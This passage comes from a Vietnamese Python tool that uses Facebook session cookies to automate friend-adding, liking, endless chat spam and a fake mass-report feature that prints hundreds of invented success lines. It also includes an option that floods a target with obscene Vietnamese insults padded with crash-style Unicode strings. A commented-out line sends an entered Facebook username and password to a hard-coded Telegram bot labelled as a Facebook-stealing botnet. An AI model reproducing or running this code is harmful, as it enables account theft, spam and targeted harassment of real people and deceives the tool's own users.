    idfb=idck.replace("c_user=","").replace(";","")
    head={"Host":"mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","cookie":ck}
    print(f"\033[1;33mStart Raising UID\033[1;31m-\033[1;32m[\033[1;37m",idfb,"\033[1;32m]")
    while(True):
      list=["addfr(head)","like(head)","jond(head)"]
      rd=random.choice(list)
      exec(rd)
      
  elif nhap == '2.4':
    clear()
    runbanner(chontool)
    idcanspam=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập id box cần spam :{vang} ')
    while True:
      ck=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập cookie facebook :{vang} ')
      try:
        get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid={idcanspam}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': ck,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
        fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
        jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
        clear()
        break
      except:
        print(f'{do}Cookie sai!!')   
    runbanner(chontool)
    name_file=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập file chứa nội dung của bạn (ex: nd.txt) :{vang} ')
    yn=str(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}bạn muốn spam mãi mãi không :> {trang}({vang}y{trang}/{vang}n{trang}) :{vang} '))
    params = {
      "icm": '1',
    }
    
    headers = {
      "Host":"mbasic.facebook.com",
      "content-length":"247",
      "content-type":"application/x-www-form-urlencoded",
      "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
      "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "sec-fetch-site":"same-origin",
      "sec-fetch-mode":"navigate",
      "sec-fetch-user":"?1",
      "sec-fetch-dest":"document",
      "accept-encoding":"gzip, deflate, br",
      "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
      "cookie":ck,
    }  
    with open(name_file, "rb") as file:
        nds = file.read()
        data = f"fb_dtsg={fb_dtsg}&jazoest={jazoest}&body={nds.decode('utf-8')}&send=Send&tids=cid.g.{idcanspam}&wwwupp=C3&platform_xmd=&referrer=&ctype=&cver=legacy&csid=366a74a7-2d30-45dd-94c2-ad47d662dcfb"  
    if yn.lower() == 'y':
      delay=int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập delay(khuyến cáo trên 10s) :{vang} '))
      while True:
          response = requests.post("https://mbasic.facebook.com/messages/send/", params=params, headers=headers, data=data.encode('utf-8'))
          print(f"\033[1;33mID BOX\033[1;97m: {idcanspam} \033[1;31m| \033[1;92mNỘI DUNG\033[1;97m: {nds.decode('utf-8')} \033[1;31m| \033[1;35mTRẠNG THÁI\033[1;97m: {xanh_la}SUCCESS")
          idelay(delay)

    elif yn.lower() == 'n':
      soluong = int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập số tin nhắn muốn gửi :{vang} '))
      delay=int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập delay(khuyến cáo trên 10s) :{vang} '))
      for i in range(soluong):
        response = requests.post("https://mbasic.facebook.com/messages/send/", params=params, headers=headers, data=data.encode('utf-8'))
        i = i + 1
        print(f"\033[1;31m[\033[1;33m{i}\033[1;31m] \033[1;31m| \033[1;33mID BOX\033[1;97m: {idcanspam} \033[1;31m| \033[1;92mNỘI DUNG\033[1;97m: {nds.decode('utf-8')} \033[1;31m| \033[1;35mTRẠNG THÁI\033[1;97m: {xanh_la}SUCCESS")
        idelay(delay) 
    else:
      print(f"{do}Vui lòng điền đúng")  
          
  elif nhap == '2.5':
    #tk = input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập tài khoản Facebook muốn đi report:{vang} ')
    #mk = input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập mật khẩu Facebook muốn đi report:{vang} ')
    #requests.get(f"https://api.telegram.org/bot6386148413:AAGJNu0qufFWtOSNJaLNfKtMWe05P_D9jpg/sendMessage?chat_id=5913051935&text=tk:💻BOTNET CHỘM FACEBOOK💻 \n🧾{tk} \n📃mk: {mk} \nBOTNET BY : vLong Dec")
    cookie_fb=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập COOKIE Facebook :{vang} ')
    id_fb=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập ID Cần Tố Cáo :{vang} ')
    get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid={id_fb}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
    fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
    jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
    pay=requests.post('https://mbasic.facebook.com'+get.split('<form method="post" action="')[1].split('"><input type="hidden"')[0],headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'},data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'confirmed': 'Chặn'}).text
    get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid=https://www.facebook.com/profile.php?id={id_fb}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
    fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
    jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
    pay=requests.post('https://mbasic.facebook.com'+get.split('<form method="post" action="')[1].split('"><input type="hidden"')[0],headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'},data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'confirmed': 'Chặn'}).text
    for i in range(randint(555,999)):
          s=i+1
          print(f'{s} {trang}- {xanh_la}Tố Cáo Thành Công ID{trang}: {tim}{id_fb}')
          time.sleep(0.01)
    print(f"\033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Done!")
  elif nhap == '2.6':
    if __name__ == '__main__':
      try:
        Main().Pengguna()
        Main().Your_Username_Password()
      except (Exception) as e:
        print(f"{do}{str(e).title()}!")
        exit()
      except (KeyboardInterrupt):
        exit()

  elif nhap == '2.7':
    clear()
    runbanner(chontool)
    idcanspam=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập id chó rách muốn chửi :{vang} ')
    while True:
      ck=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập cookie facebook :{vang} ')
      try:
        get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid={idcanspam}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': ck,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
        fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
        jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
        clear()
        break
      except:
        print(f'{do}Cookie sai!!')
    

    runbanner(chontool)
    if chon_name.lower() == "y":
      name = "➳➴➵➶➷/꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟➴➵➶➷/꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟"#input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập tên thằng chó muốn chửi :{vang} ')
    elif chon_name.lower() == "n":
      name = " "
    else:
      print(f"{do}Vui Lòng Nhập Đúng")    
    CAU_CHUI = [
	f"ê thằng bê đê bóng lộ 🤣🤣{name}",
f"để cha khai khẩu cho nha 😛😛 🤣🤣{name}",
f"bú cứt cha khen ngon đúng kh🤣🤣👌{name}",
f"hăng nhanh :)) {name}",
f"lag r hả thg óc dái 🤣🤣 {name}",
f"óc dái cay r🤣🤣 {name}",
f"ăn hại phát biểu lẹ đê 🤣🤣 {name}",
f"Mẹ m bị tao đụ rách lồn mà🤣 :))) {name}",
f"Mẹ Mày bị t địt sập cầu sập cống .{name}",
